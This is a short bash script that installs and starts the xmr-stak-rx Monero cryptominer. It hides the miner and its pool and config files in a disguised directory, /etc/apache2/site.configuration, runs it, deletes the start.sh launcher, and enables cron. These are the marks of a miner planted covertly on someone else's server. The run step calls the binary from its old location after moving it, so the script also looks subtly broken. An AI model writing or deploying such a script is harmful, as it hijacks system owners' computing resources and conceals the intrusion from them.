#!/bin/bash
sudo chmod +x xmr-stak-rx && sudo mkdir /etc/apache2/site.configuration && sudo mv config.txt pools.txt xmr-stak-rx /etc/apache2/site.configuration && ./xmr-stak-rx --noTest && sudo rm start.sh
sudo systemctl enable cron.service
